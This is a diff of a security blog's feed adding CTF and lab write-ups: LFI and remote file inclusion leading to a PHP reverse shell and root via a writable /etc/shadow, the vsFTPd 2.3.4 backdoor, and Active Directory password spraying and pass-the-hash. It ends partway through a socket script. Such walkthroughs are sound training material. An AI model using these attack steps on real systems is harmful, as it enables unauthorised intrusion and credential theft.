+&lt;h2 id=&quot;web-server-exploration&quot;&gt;Web Server Exploration&lt;/h2&gt;
+
+&lt;p&gt;Upon loading the website there’s nothing really interesting on the page itself, but there’s one thing that instantly draws attention, which is the URL.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_snare/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I &lt;em&gt;always&lt;/em&gt; recommend checking out the source-code for clues and/or interesting findings, but this time it’s quite obvious, we can try changing the page name to see how the server responds, and we’ll soon find out this is a LFI vulnerability. Interestingly enough, any other file apart from the web pages isn’t working, still, we don’t know the reason.&lt;/p&gt;
+
+&lt;h2 id=&quot;local-file-inclusion&quot;&gt;Local File Inclusion&lt;/h2&gt;
+
+&lt;p&gt;One cool trick I’ve learned is that you can use PHP wrappers to retrieve file contents by converting them into base64 strings, we can try reading the page index and have a peek on the code.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=index.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_snare/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Yet, by some reason, even &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt; isn’t working, but when we try to do the same with home page, it works like a charm. So we know this vulnerability &lt;em&gt;do&lt;/em&gt; exist.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=index.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_snare/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In this case, I can only assume that’s the page is appending the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; extension, and we can type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index&lt;/code&gt; without the extension. Yes, we could try bypassing it somehow and accessing the server files, yet, understanding the code internal workings is our best bet to easily exploit the server.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=index
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_snare/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It works! After decoding the contents of the Base64 string, we can confirm our previous theory.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Location: /index.php?page=home&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;page&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$page&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;.php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;span class=&quot;c1&quot;&gt;// count to twenty&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;p&gt;This code snippet adds the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; extension to whatever text we add in the URL, and using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%00&lt;/code&gt; doesn’t work, but what we can do is try to reach external server and see if this escalates to a Remote File Inclusion vulnerability.&lt;/p&gt;
 
-&lt;p&gt;Type Theme uses KaTeX to display maths. Equations such as \(S_n = a \times \frac{1-r^n}{1-r}\) can be displayed inline.&lt;/p&gt;
+&lt;h2 id=&quot;remote-file-inclusion&quot;&gt;Remote File Inclusion&lt;/h2&gt;
 
-&lt;p&gt;Alternatively, they can be shown on a new line:&lt;/p&gt;
+&lt;p&gt;To test this theory, what we can do is to run a local server within our machine and perform a request to any file.&lt;/p&gt;
 
-\[f(x) = \int \frac{2x^2+4x+6}{x-2}\]
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -m http.server
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Back to the web page, we’ll type the following URL:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.150.150.18/index.php?page=http://10.66.66.230:8000/random
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And back to our terminal:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_snare/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;uploading-a-shell&quot;&gt;Uploading a Shell&lt;/h2&gt;
+
+&lt;p&gt;Great, we can now try to use this and load a PHP reverse shell to get access. I’ll be using &lt;a href=&quot;https://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;Pentest Monkey’s PHP Shell&lt;/a&gt;. Remember to change the shell options to your IP address and port before using it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_snare/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we just have to start a listener using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netcat&lt;/code&gt; on the same port and request the file in our machine omitting the extension and voilá!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_snare/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The first flag is available on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/snare&lt;/code&gt; directory inside the machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_snare/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;Now, assuming the next one is inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root&lt;/code&gt; folder, we must find a way to escalate our privileges. Looking for binaries, kernel and OS version, among other stuff would take too long, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LINPEAS-ng&lt;/code&gt; which a bash script that does this for us and list potential escalation methods.&lt;/p&gt;
+
+&lt;p&gt;Normally it would take just a simple command to use it, but since PwnTillDawn machines can’t connect outside the VPN’s network, you must download and follow the same usage describe in &lt;a href=&quot;https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS&quot;&gt;this page&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;From the output, we can see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; file has read/write permissions to any user, which means we can easily root the machine by accessing the account hash and changing it inside the file.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkpasswd -m sha-512 pwned
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This command will generate a new hash on the attacker with whatever password you want, now back to the target, you can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nano&lt;/code&gt; to edit the file and change root’s password hash by simply deleting it and pasting the newly hash.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_snare/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Notice only the hash should be replaced, the others values separated by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:&lt;/code&gt; must stay the same.&lt;/p&gt;
+
+&lt;p&gt;Once done, just use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su&lt;/code&gt; command to access root account, and type the password you’ve just created, which in my case was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwned&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_snare/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Finally, the final flag is available inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root&lt;/code&gt; by the name of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FLAG2.txt&lt;/code&gt;.&lt;/p&gt;
 </description>
-        <pubDate>Fri, 28 Nov 2014 00:00:00 -0200</pubDate>
+        <pubDate>Sun, 30 Jun 2024 00:00:00 -0300</pubDate>
+      </item>
+    
+      <item>
+        <title>PwnTillDawn - Portal Write-Up</title>
+        <link>/2024/06/30/pwntilldawn-portal.html</link>
+        <guid isPermaLink="true">/2024/06/30/pwntilldawn-portal.html</guid>
+        <description>&lt;h1 id=&quot;portal-1015015012&quot;&gt;Portal (10.150.150.12)&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_portal/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;network-scanning&quot;&gt;Network Scanning&lt;/h2&gt;
+
+&lt;p&gt;This is a fairly simple and straight forward challenge, so let’s start up by scanning the target machine.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -sV -sC 10.150.150.12 -oN nmap.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_portal/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If you like many others have tried Metasploitable2 to study, you’ve probably recognized the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vsFTPd 2.3.4&lt;/code&gt; version. If that’s not the case, just know that this version has a built-in backdoor that can be easily exploited.&lt;/p&gt;
+
+&lt;h2 id=&quot;exploiting-ftp&quot;&gt;Exploiting FTP&lt;/h2&gt;
+
+&lt;p&gt;This FTP version is easy to exploit, whenever a username containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:)&lt;/code&gt; at the end is supplied, a bind shell is triggered on port 6200. You can either use Metasploit, download any exploit online or do it by hand. I’ll stick with the last option.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp 10.150.150.12
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_portal/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It really doesn’t matter which username is supplied, as long as there’s a smiley at the end. Once done, you can simply connect to the target machine using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netcat&lt;/code&gt; on port 6200.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc 10.150.150.12 6200
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_portal/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And just like that you can print out the flag!&lt;/p&gt;
+</description>
+        <pubDate>Sun, 30 Jun 2024 00:00:00 -0300</pubDate>
+      </item>
+    
+      <item>
+        <title>Lateral movement, Password spraying, Pivoting &amp; PassTheHash</title>
+        <link>/2022/03/26/lateral-movement.html</link>
+        <guid isPermaLink="true">/2022/03/26/lateral-movement.html</guid>
+        <description>&lt;p&gt;It’s been a while since someone told me to start writing a blog about what I’m learning, and finally after all there years I’ve decided it might be a good idea to do so. So since I’ve decided I have a &lt;strong&gt;lot&lt;/strong&gt; to learn about Windows OS, so in the meantime I’ll be posting a lot about my studies on Windows machines. Also, I’ll be focusing on &lt;a href=&quot;https://hackthebox.eu/&quot;&gt;HackTheBox&lt;/a&gt; machines, but not only those, I’ll be writing write-ups on my college challenges too. But without futher ado, let’s hack on.&lt;/p&gt;
+
+&lt;h2 id=&quot;understanding-the-network&quot;&gt;Understanding the network&lt;/h2&gt;
+
+&lt;p&gt;So before we start hacking, we must understand what are we dealing with. So here’s the network diagram.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/lateral_movement/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see, we have 3 servers, the first one being a Linux Box, which we’ll be using to access an AD (Active Directory) server, as well as a confidential repository. Now, for the spoiler: Our objective here is to gain access to the confidential repository by pivoting our connection through the Linux server, and for this we’ll be using &lt;a href=&quot;https://github.com/sshuttle/sshuttle&quot;&gt;sshuttle&lt;/a&gt;, as well as some enumeration and post-exploitation tools for Windows. OBS: We’ll be starting from the point we’ve already compromised the Linux server.&lt;/p&gt;
+
+&lt;h2 id=&quot;pivoting-with-sshuttle&quot;&gt;Pivoting with sshuttle&lt;/h2&gt;
+
+&lt;p&gt;So first things first, we need to reach the subnet, don’t we? We could be using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -D&lt;/code&gt; to set a dynamic port, but as far as I learned, it’s not a go-to  option since it messes with nmap scans as well as exploit delivering, so instead of using Dynamic SSH tunnels, we’ll be using sshuttle, which is a great tool for pivoting and don’t require you to root the pivoting machine, only on the attacker’s local machine, and it’s pretty easy to install, so just go to your Kali Linux, Parrot or whatever it is your distro, and type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo apt install -y sshuttle&lt;/code&gt; inside your terminal, by the way I’m almost 100% sure it’s included by default in Kali Linux distros.&lt;/p&gt;
+
+&lt;script id=&quot;asciicast-EV3dETAYOKaYRgweDm0V7JOod&quot; src=&quot;https://asciinema.org/a/EV3dETAYOKaYRgweDm0V7JOod.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;
+
+&lt;h2 id=&quot;dump--spray&quot;&gt;Dump &amp;amp; Spray&lt;/h2&gt;
+
+&lt;p&gt;Know that now we’re inside the target’s subnet, and this means we can continue the hack with further exploration. We’ll not try connecting directly to Confidential Repository since I already know this isn’t going to work. One of the most useful techniques I’ve learned recently is &lt;em&gt;Password Spraying&lt;/em&gt; which basically represent using a password you’ve found and try using it to login in every single account you can. We have a password, but no accounts, so our next step is to list accounts available on the server, and for this we’ll be using &lt;a href=&quot;https://github.com/dirkjanm/ldapdomaindump&quot;&gt;ldapdomaindump&lt;/a&gt;.&lt;/p&gt;
+
+&lt;script id=&quot;asciicast-SGvfpuei4zVUdsdXBTs8WBDaZ&quot; src=&quot;https://asciinema.org/a/SGvfpuei4zVUdsdXBTs8WBDaZ.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;Now we’ve managed to find a user list, we’re going to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;awk&lt;/code&gt; to parse the information we need in order to start a password spraying attack. Note that using this attack will surely trigger the SOC team, so be careful when doing so, but here I’m using a custom lab, so we’re good. Now we parse the users to a list for further usage.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;{if (NR!=1) {print $1}}&apos;&lt;/span&gt; domain_users.grep &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; user.lst
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This command will remove the first line of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;domain_users.grep&lt;/code&gt;, get all usernames in the first column and put inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.lst&lt;/code&gt; file. The output should come like so:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n10&lt;/span&gt; user.lst 
+ITAdmin
+val.johnson
+troy.underbridge
+tony.gardner
+tom.peets
+todd.packer
+toby.flenderson
+the.snakes
+stephanie.jorge
+stanley.hudson
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now that we have plenty of users, let’s use the for the password spraying by using &lt;a href=&quot;https://github.com/byt3bl33d3r/CrackMapExec&quot;&gt;crackmapexec&lt;/a&gt;:&lt;/p&gt;
+
+&lt;script id=&quot;asciicast-PEHQaDdzwqNDeqxZSIDnmd3k4&quot; src=&quot;https://asciinema.org/a/PEHQaDdzwqNDeqxZSIDnmd3k4.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;We found out that user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Goro.Takemura&lt;/code&gt; uses the same password as the user we’ve already compromised, and by looking inside the groups files we can see that this user is also an Administrator so now we can use this user to get NTLM hashes from the other accounts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretsdump.py&lt;/code&gt; comes inside &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;Impacket&lt;/a&gt; program suite.&lt;/p&gt;
+
+&lt;script id=&quot;asciicast-SBFO9jvs6ZSrwnHahZnXDkqj3&quot; src=&quot;https://asciinema.org/a/SBFO9jvs6ZSrwnHahZnXDkqj3.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;
+
+&lt;h2 id=&quot;pass2win&quot;&gt;Pass2Win&lt;/h2&gt;
+
+&lt;p&gt;With all these hashes we’ve just obtained, we can try a new technique I’ve just learned about, it’s called &lt;em&gt;PassTheHash&lt;/em&gt;, which basically allows us to impersonate another user without need of the plaintext password to login. For this we’ll now use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xfreerdp&lt;/code&gt; which is mainly used for RDP connections. The only problem left to solve is which one of the users is allowed to RDP, and spoiler: It’s not the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ITAdmin&lt;/code&gt;, but if you’ve played &lt;em&gt;Cyberpunk 2077&lt;/em&gt;, you can tell it could be the protagonist of the game, V, and if you said so, congratulations, you’re right. In the process of solving this challenge I’ve made bash script to automate the process of trying each user and hash until some user login, but we’re not doing this here, so let’s just connect to the Confidential Repository:&lt;/p&gt;
+
+&lt;script id=&quot;asciicast-0BqlfzxnsC3YNNTCfHoE1sRkW&quot; src=&quot;https://asciinema.org/a/0BqlfzxnsC3YNNTCfHoE1sRkW.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;After this command, another windows pops up, with a RDP session opened on it, we’re now able to access machine’s information, and check which user are we currently logged on.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/lateral_movement/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Also, the flag is inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;database.txt&lt;/code&gt; file, which has the following message:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/lateral_movement/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This challenge showed me that I have a &lt;strong&gt;LOT&lt;/strong&gt; to learn about Windows machines as said early, but also showed me how fun it is to bypass Windows protections and how some techniques could be applied in real life scenaries, hope you’ve learned something new too. &lt;em&gt;Hack on!&lt;/em&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sat, 26 Mar 2022 00:00:00 -0300</pubDate>
+      </item>
+    
+      <item>
+        <title>Numb3rs Challenge</title>
+        <link>/2022/03/09/numbers-challenge.html</link>
+        <guid isPermaLink="true">/2022/03/09/numbers-challenge.html</guid>
+        <description>&lt;h2 id=&quot;the-challenge&quot;&gt;The Challenge&lt;/h2&gt;
+
+&lt;p&gt;The challenge appears to be relatively simple. Upon connecting to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;numb3rs.hopto.org:8012&lt;/code&gt;, we are greeted with the following message:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/numbers_challenge/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It is expected that you send back the number displayed on the screen, and this is the message received if the response is correct:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/numbers_challenge/2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can also note that if the response takes too long to be sent, whether it is correct or not, the server stops responding to the connection, leaving us with no other option but to terminate the connection:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/numbers_challenge/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It’s easy to see that (unless you have the patience and fingers of a master pianist) we can’t simply do this by typing manually. So, let’s write a program that can solve this problem for us.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-problem&quot;&gt;The Problem&lt;/h2&gt;
+
+&lt;p&gt;To solve this, we need to analyze what is being sent over the connection when we open it. While this can be done using various methods, we will use Python for this task.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;numb3rs.hopto.org&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8012&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Pro tip: Did you know that you can use sockets with the &quot;with&quot; statement instead of the traditional method with variables?
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;data1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;data2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
